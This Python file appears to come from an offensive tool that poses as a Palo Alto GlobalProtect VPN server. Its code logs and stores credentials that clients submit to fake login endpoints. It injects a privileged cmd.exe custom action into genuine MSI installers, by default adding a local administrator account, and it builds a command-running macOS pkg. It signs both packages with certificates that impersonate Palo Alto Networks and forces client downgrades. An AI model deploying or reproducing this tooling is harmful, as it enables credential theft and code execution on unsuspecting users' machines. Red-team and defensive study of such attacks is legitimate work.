from nachovpn.plugins import VPNPlugin
from flask import Response, abort, request, redirect
from nachovpn.plugins.paloalto.pkg_generator import generate_pkg
from nachovpn.plugins.paloalto.msi_patcher import get_msi_patcher, random_hash, ACTION_TYPE_SHELL, ACTION_TYPE_CONTINUE, \
    ACTION_TYPE_ASYNC, ACTION_TYPE_COMMIT, ACTION_TYPE_IN_SCRIPT, ACTION_TYPE_NO_IMPERSONATE

import logging
import traceback
import subprocess
import shutil
import ssl
import os
import io
import re

# SSL-VPN packet types
SSL_VPN_MAGIC = bytes.fromhex('1a2b3c4d')
SSL_VPN_STATIC = bytes.fromhex('0100000000000000')
KEEP_ALIVE_PACKET = bytes.fromhex('1a2b3c4d000000000000000000000000')
ETHER_TYPES = {0x0800: 'IPv4', 0x0806: 'ARP', 0x86dd: 'IPv6'}

class PaloAltoPlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        # provide the templates directory relative to this plugin
        super().__init__(*args, **kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))

        # Payload storage
        self.payload_dir = os.path.join(os.getcwd(), 'payloads')
        self.download_dir = os.path.join(os.getcwd(), 'downloads')
        os.makedirs(self.payload_dir, exist_ok=True)
        os.makedirs(self.download_dir, exist_ok=True)

        # Payload options
        self.msi_force_patch = os.getenv("PALO_ALTO_FORCE_PATCH", False)
        self.msi_add_file = os.getenv("PALO_ALTO_MSI_ADD_FILE", None)
        self.msi_increment_version = os.getenv("PALO_ALTO_MSI_INCREMENT_VERSION", True)
        self.pkg_command = os.getenv("PALO_ALTO_PKG_COMMAND", "touch /tmp/pwnd")
        self.msi_command = os.getenv(
            "PALO_ALTO_MSI_COMMAND",
            r"net user pwnd Passw0rd123! /add && net localgroup administrators pwnd /add"
        )

        # Certificate paths
        self.apple_cert_path = os.path.join('certs', 'paloalto-apple.cer')
        self.apple_key_path = os.path.join('certs', 'paloalto-apple.key')
        self.codesign_cert_path = os.path.join('certs', 'paloalto-codesign.cer')
        self.codesign_key_path = os.path.join('certs', 'paloalto-codesign.key')
        self.codesign_pfx_path = os.path.join('certs', 'paloalto-codesign.pfx')

        # Gateway config
        self.gateway_config = {
            "gateway_ip": self.external_ip,
            "ca_certificate": "",
            "dns_name": self.dns_name,
            "version": "6.3.2-376",
            "should_downgrade": False
        }

        # Run bootstrap
        if not self.bootstrap():
            self.logger.error(f"Failed to bootstrap. Disabling {self.__class__.__name__}")
            self.enabled = False

    def generate_pkg(self):
        pkg_buf = generate_pkg(
            self.gateway_config["version"].replace('-', 'f'),
            self.pkg_command,
            "GlobalProtect",
            self.apple_cert_path,
            self.apple_key_path,
            self.cert_manager.ca_cert_path
        )
        pkg_path = os.path.join(self.payload_dir, "GlobalProtect.pkg")
        with open(pkg_path, 'wb') as f:
            f.write(pkg_buf)
        return pkg_path

    def get_higher_version(self, version):
        version = version.split('-')[0]
        major, minor, patch = map(int, version.split('.'))
        patch += 1
        if patch == 100:
            minor += 1
            patch = 0
        if minor == 100:
            major += 1
            minor = 0
        return f"{major}.{minor}.{patch}"

    def get_latest_msi_version(self):
        version_file = os.path.join(self.download_dir, "msi_version.txt")
        if not os.path.exists(version_file):
            self.logger.error(f"MSI version file not found")
            self.logger.info(f"Run downloader to fetch latest MSI files, or manually add {version_file}")
            return None

        with open(version_file, "r") as f:
            version = f.read().strip()

        self.logger.info(f"Latest MSI version: {version}")
        return version

    def sign_msi_files(self):
        if not os.path.exists(self.codesign_cert_path):
            self.logger.error("Windows code signing certificate not found, skipping signing")
            return False

        if not os.path.exists(os.path.join(self.payload_dir, "GlobalProtect.msi")) or \
           not os.path.exists(os.path.join(self.payload_dir, "GlobalProtect64.msi")):
            self.logger.error("MSI files not found, skipping signing")
            return False

        if os.name == "nt":
            self.logger.error("Windows MSI signing not supported yet")
            return False

        if not os.path.exists('/usr/bin/osslsigncode'):
            self.logger.error("osslsigncode not found, skipping signing")
            return False

        # Sign the MSI files
        for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
            input_file = os.path.join(self.payload_dir, msi_file)
            output_file = os.path.join(self.payload_dir, f"{msi_file}.signed")

            # Remove existing signed file
            if os.path.exists(output_file):
                os.remove(output_file)

            proc = subprocess.run([
                "/usr/bin/osslsigncode", "sign", "-pkcs12", self.codesign_pfx_path,
                "-in", input_file, "-out", output_file,
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if proc.returncode or not os.path.exists(output_file):
                self.logger.error(f"Failed to sign {msi_file}: {proc.returncode}")
                return False
            else:
                self.logger.info(f"Signed {msi_file}")
                os.replace(output_file, input_file)
        return True

    def verify_msi_files(self):
        # Verify that the MSI files are signed by our current CA
        if os.name == "nt":
            self.logger.error("Windows MSI verification not supported yet")
            return True

        if os.name == "posix" and not os.path.exists('/usr/bin/osslsigncode'):
            self.logger.error("osslsigncode not found, skipping verification")
            return True

        for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
            proc = subprocess.run([
                "/usr/bin/osslsigncode", "verify", "-CAfile", self.cert_manager.ca_cert_path,
                "-in", os.path.join(self.payload_dir, msi_file),
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if proc.returncode:
                self.logger.error(f"Failed to verify {msi_file}: {proc.returncode}")
                return False

        self.logger.info("MSI files verified")
        return True

    def patch_msi_files(self):
        # Patch the msi files
        if os.path.exists(os.path.join(self.payload_dir, "GlobalProtect.msi")) and \
           os.path.exists(os.path.join(self.payload_dir, "GlobalProtect64.msi")) and \
           not self.msi_force_patch and self.verify_msi_files():
            self.logger.warning("MSI files already patched, skipping")
            return True

        if os.name == "posix" and not os.path.exists('/usr/bin/msidump'):
            self.logger.error("msitools not found, skipping patching")
            return True

        # Check if MSI files are present
        if not os.path.exists(os.path.join(self.download_dir, "GlobalProtect.msi")) or \
           not os.path.exists(os.path.join(self.download_dir, "GlobalProtect64.msi")):
            self.logger.warning(f"MSI files not found in download directory: {self.download_dir}")
            self.logger.info(f"Run downloader to fetch latest MSI files, or add manually")
            return False

        patcher = get_msi_patcher()

        for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
            # Copy default MSI file to payload directory
            input_file = os.path.join(self.download_dir, msi_file)
            output_file = os.path.join(self.payload_dir, msi_file)
            shutil.copy(input_file, output_file)

            # Add patches
            if self.msi_add_file:
                patcher.add_file(output_file, self.msi_add_file, random_hash(), "DefaultFeature")
                self.logger.info(f"Added file {self.msi_add_file} to {msi_file}")

            if self.msi_command:
                action_type = (ACTION_TYPE_SHELL | ACTION_TYPE_CONTINUE | ACTION_TYPE_ASYNC | ACTION_TYPE_COMMIT |
                               ACTION_TYPE_IN_SCRIPT | ACTION_TYPE_NO_IMPERSONATE)
                patcher.add_custom_action(output_file, f"_{random_hash()}", action_type,
                                          "C:\\windows\\system32\\cmd.exe", f"/c {self.msi_command}", 
                                          "InstallExecuteSequence")
                self.logger.info(f"Added custom action to {msi_file}")

            if self.msi_increment_version:
                patcher.increment_msi_version(output_file)
                self.logger.info(f"Incremented MSI version for {msi_file}")

        self.logger.info("MSI files patched")
        return True

    def bootstrap(self):
        # Generate an Apple code signing certificate
        if not os.path.exists(self.apple_cert_path) or not os.path.exists(self.apple_key_path):
            self.cert_manager.generate_apple_certificate(
                common_name="Developer ID Installer: Palo Alto Networks (PXPZ95SK77)",
                cert_path=self.apple_cert_path,
                key_path=self.apple_key_path
            )

        # Generate a Windows code signing certificate
        if not os.path.exists(self.codesign_cert_path) or not os.path.exists(self.codesign_key_path):
            self.cert_manager.generate_codesign_certificate(
                common_name="Palo Alto Networks",
                cert_path=self.codesign_cert_path,
                key_path=self.codesign_key_path,
                pfx_path=self.codesign_pfx_path
            )

        # Load the CA certificate into the gateway config
        with open(self.cert_manager.ca_cert_path, 'r') as f:
            self.gateway_config["ca_certificate"] = f.read()

        # Generate the macOS pkg payload (GlobalProtect.pkg)
        self.generate_pkg()

        # Get latest MSI version
        latest_version = self.get_latest_msi_version()
        if not latest_version:
            return False

        # Set version in gateway config
        if self.msi_increment_version:
            bump = self.get_higher_version(latest_version)
            self.logger.info(f"Bumping version from {latest_version} to {bump}")
            self.gateway_config["version"] = bump

        # Check for .old MSI files
        for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
            old_file = os.path.join(self.download_dir, f"{msi_file}.old")
            if not os.path.exists(old_file):
                self.logger.warning(f"Older version MSI file not found: {old_file}")
                self.logger.info(f"Add {msi_file}.old to {self.download_dir} to enable version downgrade")

        # Patch the Windows MSI files and sign them
        if not self.patch_msi_files():
            return False
        if not self.sign_msi_files():
            return False
        return True

    def close(self):
        self.ssl_server_socket.close()

    def can_handle_data(self, data, client_socket, client_ip):
        return len(data) >= 4 and data[:4] == SSL_VPN_MAGIC

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        self.logger.info(f"User-Agent: {user_agent}")
        if 'GlobalProtect' in user_agent or \
           handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
            return True
        return False

    def handle_http(self, handler):
        if handler.command == 'GET' and handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
            # Start the tunnel
            self.logger.info('Starting tunnel')
            handler.connection.sendall(b'START_TUNNEL')
            # Pass handling to data handler
            return self.handle_data(b'', handler.connection, handler.client_address[0])
        elif handler.command == 'GET':
            return self.handle_get(handler)
        elif handler.command == 'POST':
            return self.handle_post(handler)
        return False

    def _setup_routes(self):
        # Call the parent class's route setup
        super()._setup_routes()

        @self.flask_app.route('/global-protect/prelogin.esp', methods=['GET', 'POST'])
        def global_protect_pre_login():
            self.check_client_version(request.headers.get('User-Agent', ''))
            xml = self.render_template('prelogin.xml')
            return Response(xml, mimetype='application/xml')

        @self.flask_app.route('/ssl-vpn/prelogin.esp', methods=['GET', 'POST'])
        def ssl_vpn_pre_login():
            self.check_client_version(request.headers.get('User-Agent', ''))
            xml = self.render_template('sslvpn-prelogin.xml')
            return Response(xml, mimetype='application/xml')

        @self.flask_app.route('/ssl-vpn/login.esp', methods=['GET', 'POST'])
        def ssl_vpn_login():
            if request.method == "POST":
                username = request.form.get('user')
                password = request.form.get('passwd')
                if username:
                    self.logger.info(f"Username: {username}")
                if password:
                    self.logger.info(f"Password: {password}")
                if username and password:
                    info = {'User-Agent': request.headers.get('User-Agent')}
                    self.db_manager.log_credentials(
                        username,
                        password,
                        self.__class__.__name__,
                        info
                    )

            self.check_client_version(request.headers.get('User-Agent', ''))
            xml = self.render_template('sslvpn-login.xml')
            return Response(xml, mimetype='application/xml')

        @self.flask_app.route('/global-protect/getconfig.esp', methods=['GET', 'POST'])
        def global_protect_get_config():
            if request.method == "POST":
                username = request.form.get('user')
                password = request.form.get('passwd')
                if username:
                    self.logger.info(f"Username: {username}")
                if password:
                    self.logger.info(f"Password: {password}")
                if username and password:
                    info = {'User-Agent': request.headers.get('User-Agent')}
                    self.db_manager.log_credentials(
                        username,
                        password,
                        self.__class__.__name__,
                        info
                    )

            self.check_client_version(request.headers.get('User-Agent', ''))
            xml = self.render_template('pwresponse.xml', **self.gateway_config)
            return Response(xml, mimetype='application/xml')

        @self.flask_app.route('/ssl-vpn/getconfig.esp', methods=['GET', 'POST'])
        def ssl_vpn_get_config():
            if request.method == "POST":
                username = request.form.get('user')
                password = request.form.get('passwd')
                if username:
                    self.logger.info(f"Username: {username}")
                if password:
                    self.logger.info(f"Password: {password}")
                if username and password:
                    info = {'User-Agent': request.headers.get('User-Agent')}
                    self.db_manager.log_credentials(
                        username,
                        password,
                        self.__class__.__name__,
                        info
                    )

            self.check_client_version(request.headers.get('User-Agent', ''))
            xml = self.render_template('getconfig.xml', **self.gateway_config)
            return Response(xml, mimetype='application/xml')

        @self.flask_app.route('/global-protect/getmsi.esp', methods=['GET', 'POST'])
        def get_msi_redirect():
            user_agent = request.headers.get('User-Agent')
            if 'apple mac' in user_agent.lower() or 'darwin' in user_agent.lower():
                return redirect(f"/msi/GlobalProtect.pkg", code=302)
            elif request.args.get('version') == '64':
                return redirect(f"/msi/GlobalProtect64.msi", code=302)
            return redirect(f"/msi/GlobalProtect.msi", code=302)

        @self.flask_app.route('/msi/<file_name>', methods=['GET'])
        def download_msi(file_name):
            if file_name not in ['GlobalProtect.pkg', 'GlobalProtect.msi', 'GlobalProtect64.msi']:
                return abort(404)

            # Use the downgrade flag to determine which version to serve
            if self.gateway_config["should_downgrade"]:
                file_path = os.path.join(self.download_dir, f"{file_name}.old")
            else:
                file_path = os.path.join(self.payload_dir, file_name)

            if not os.path.exists(file_path):
                self.logger.error(f"Download file not found: {file_path}")
                return abort(404)

            file_size = os.path.getsize(file_path)

            headers = {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': f'attachment; filename="{file_name}"',
                'Content-Length': str(file_size)
            }

            self.logger.info(f"Serving {file_path}")

            with open(file_path, 'rb') as f:
                file_content = f.read()

            return Response(file_content, headers=headers)

    def process_tcp_message(self, client_socket, data, client_ip):
        # Process the TCP message data as needed
        if data == KEEP_ALIVE_PACKET:
            self.logger.debug(f"Received KEEP_ALIVE Packet from {client_ip}")
            client_socket.sendall(KEEP_ALIVE_PACKET)
            return
        elif data[0:4] != SSL_VPN_MAGIC:
            # Not an SSL-VPN packet
            self.logger.warning(f"Received Unhandled TCP message from {client_ip}: {data.hex()}")
            return

        # Parse the tunelled packet
        buf = io.BytesIO(data)
        magic = buf.read(4)
        assert magic == SSL_VPN_MAGIC
        ether_type = int.from_bytes(buf.read(2), 'big')
        ether_str = ETHER_TYPES.get(ether_type, 'UNKNOWN')
        packet_length = int.from_bytes(buf.read(2), 'big')
        static_bytes = buf.read(8)
        assert static_bytes == SSL_VPN_STATIC
        packet_data = buf.read(packet_length)
        assert len(packet_data) == packet_length
        assert buf.tell() == len(data)

        self.logger.debug(f"Received SSL-VPN Packet from {client_ip}: Magic={magic.hex()}, " \
               f"EtherType={hex(ether_type)} ({ether_str}), Length={packet_length}")

        if ether_str == 'UNKNOWN':
            self.logger.warning(f"UNKNOWN Packet Type: {ether_type}")
            return

        self.packet_handler.handle_client_packet(packet_data)

    def handle_data(self, data, client_socket, client_ip):
        try:
            client_socket.setblocking(False)

            data = b''
            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break

                    data += chunk

                    # Process TCP messages
                    self.process_tcp_message(client_socket, data, client_ip)
                    data = b''
                except BlockingIOError:
                    # No data available, continue
                    continue    
                except ssl.SSLWantReadError:
                    continue

        except Exception as e:
            self.logger.error(f'Error handling connection: {type(e)}: {e}')
        finally:
            client_socket.close()
            return True
        return False

    def check_client_version(self, user_agent):
        # Check if there's a client version in the user agent
        # If so, set the should_downgrade flag based on the version
        version_match = re.search(r'GlobalProtect/(\d+\.\d+\.\d+)', user_agent)
        if version_match:
            client_version = version_match.group(1)
            self.logger.debug(f"Client version: {client_version}")

            # Compare versions
            major, minor, patch = map(int, client_version.split('.')[:3])
            if (major > 6) or (major == 6 and minor > 2) or (major == 6 and minor == 2 and int(patch) > 6):
                self.logger.debug(f"Client version {client_version} needs downgrade")
                self.gateway_config["should_downgrade"] = True
            else:
                self.logger.debug(f"Client version {client_version} is compatible")
                self.gateway_config["should_downgrade"] = False
            return client_version
        return None